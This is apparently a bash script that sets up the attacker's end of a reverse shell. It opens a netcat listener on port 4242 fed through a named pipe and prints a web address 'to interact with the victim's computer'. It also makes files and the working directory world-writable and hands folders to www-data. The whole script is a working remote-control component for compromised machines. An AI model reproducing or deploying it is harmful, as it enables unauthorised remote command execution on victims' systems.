#!/bin/bash
rm /tmp/reverseinput
mkfifo /tmp/reverseinput
chmod a+w /tmp/reverseinput
touch reverseresult
chmod 777 reverseresult
mkdir tmp
chown -R www-data ./tmp
mkdir cmd
chown -R www-data ./cmd
chmod o+w .
./feedpipe.sh &
echo "Go to http://$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1') to interact with the victim's computer"
trap '[ -n "$(jobs -pr)" ] && kill $(jobs -pr) 2&>/dev/null ' INT QUIT TERM EXIT
tail -f /tmp/reverseinput | nc -lp 4242 > reverseresult
